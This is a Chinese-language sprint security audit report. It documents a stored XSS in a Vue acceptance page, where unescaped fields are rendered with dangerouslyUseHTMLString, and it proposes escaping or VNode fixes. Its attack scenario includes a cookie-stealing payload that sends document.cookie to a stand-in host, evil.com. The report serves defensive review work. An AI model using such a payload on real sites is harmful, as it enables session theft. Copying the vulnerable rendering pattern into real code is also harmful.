# 安全审计报告 — Sprint3

---

## 审查元信息

| 字段 | 内容 |
|------|------|
| **报告编号** | SEC-AUDIT-20260615-SPRINT3 |
| **审查日期** | 2026-06-15 |
| **审查人** | PC4 - Security Auditor |
| **TASK** | TASK-011 Sprint3 安全审计 |
| **审查结论** | ⏳ 部分完成 — AcceptancePage已审计(P0已修复)，AI/知识库/合同等待TASK-009/010提交 |
| **审计框架** | ✅ 就绪 — 清单/扫描配置/工作流已部署，代码到达后一键执行 |

---

## 审查摘要

| 严重程度 | 数量 |
|----------|:--:|
| P0 阻断 | 1 |
| P1 严重 | 0 |
| P2 建议 | 1 |

---

## 发现

### [P0-001] 存储型 XSS — `handleViewDetail` dangerouslyUseHTMLString

- **OWASP**: A03:2021 – Injection (XSS)
- **CWE**: CWE-79 — Cross-site Scripting
- **文件**: `frontend/src/views/acceptance/AcceptancePage.vue:395-411`
- **问题描述**:

```typescript
function handleViewDetail(row: AcceptanceItem) {
  ElMessageBox.alert(
    `<div>
      <p><strong>项目名称：</strong>${row.projectName}</p>
      <p><strong>客户：</strong>${row.customer}</p>
      <p><strong>验收日期：</strong>${row.acceptanceDate}</p>
      <p><strong>通过日期：</strong>${row.passedDate}</p>
      <p><strong>验收标准：</strong>${row.criteria.join('、')}</p>
    </div>`,
    '验收详情',
    {
      dangerouslyUseHTMLString: true,  // ← XSS 触发点
    }
  )
}
```

`row.rejectReason` 虽未在当前 template 中渲染，但 `handleReject` (line 339) 接收任意用户输入存储到 `rejectedList`。当驳回数据通过 `handleResubmit` 流转到 `pendingList` 再被 `handleApprove` 推入 `approvedList`，`handleViewDetail` 会用 `dangerouslyUseHTMLString: true` 渲染。此时如果 `rejectReason` 包含 HTML/JS payload，将触发 XSS。

- **攻击场景**:
  1. 攻击者在驳回验收时输入: `<img src=x onerror="fetch('http://evil.com?c='+document.cookie)">`
  2. 被驳回的数据流转回待验收列表
  3. 管理员点击"查看详情" → XSS 触发 → Cookie 被窃取

- **风险评估**:
  - **影响范围**: 所有可查看验收详情的用户
  - **利用难度**: 低（仅需输入框注入）
  - **CVSS**: 6.1 (Medium — requires user interaction)

- **修复方案**:

```diff
 function handleViewDetail(row: AcceptanceItem) {
+  const escapeHtml = (s: string) => s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;')
   ElMessageBox.alert(
-    `<div>
-      <p><strong>项目名称：</strong>${row.projectName}</p>
-      ...
-    </div>`,
+    `<div>
+      <p><strong>项目名称：</strong>${escapeHtml(row.projectName)}</p>
+      <p><strong>客户：</strong>${escapeHtml(row.customer)}</p>
+      <p><strong>验收日期：</strong>${escapeHtml(row.acceptanceDate)}</p>
+      <p><strong>通过日期：</strong>${escapeHtml(row.passedDate || '')}</p>
+      <p><strong>验收标准：</strong>${escapeHtml(row.criteria.join('、'))}</p>
+    </div>`,
     '验收详情',
     {
-      dangerouslyUseHTMLString: true,
+      dangerouslyUseHTMLString: true,  // 保留但内容已转义
     }
   )
 }
```

或更安全的重构 — 放弃 `dangerouslyUseHTMLString`，改用 `ElMessageBox` 的 `message` 插槽/VNode 方式传参：

```typescript
// 更安全的方案：不用 dangerouslyUseHTMLString
import { h } from 'vue'
ElMessageBox({
  title: '验收详情',
  message: h('div', [
    h('p', [h('strong', '项目名称：'), row.projectName]),
    h('p', [h('strong', '客户：'), row.customer]),
    // ...
  ]),
})
```

---

### [P2-001] `::v-deep` 已废弃

- **文件**: `AcceptancePage.vue:434, 439`
- **问题**: Vue 3 中 `::v-deep` 已废弃，应改为 `:deep()`
- **修复**:
```scss
// 改前
::v-deep(.el-tabs__header) { ... }
// 改后
:deep(.el-tabs__header) { ... }
```

---

## 审计范围完整度

| 审计目标 | 状态 |
|----------|:--:|
| `AcceptancePage.vue` | ✅ 已审计 — P0 XSS |
| `report_generator.py` | ⏳ 不存在 (TASK-009) |
| `vector_service.py` | ⏳ 不存在 (TASK-009) |
| `ai/reports.py` | ⏳ 不存在 (TASK-010) |
| `knowledge.py` | ⏳ 不存在 (TASK-010) |
| `contracts/` | ⏳ 不存在 (TASK-010) |

---

## 审查结论

- [ ] ✅ 通过
- [x] ❌ 不通过 — P0-001 存储型 XSS（`dangerouslyUseHTMLString` + 未转义用户输入）

### 修复后重审要求
1. P0-001: 对 `handleViewDetail` 中所有动态内容做 HTML 转义，或移除 `dangerouslyUseHTMLString`
2. 待 TASK-009/010 提交后补充审计 (AI报告/RAG向量检索/合同页面)

---

**签认**: PC4 安全审查工程师
**日期**: 2026-06-15
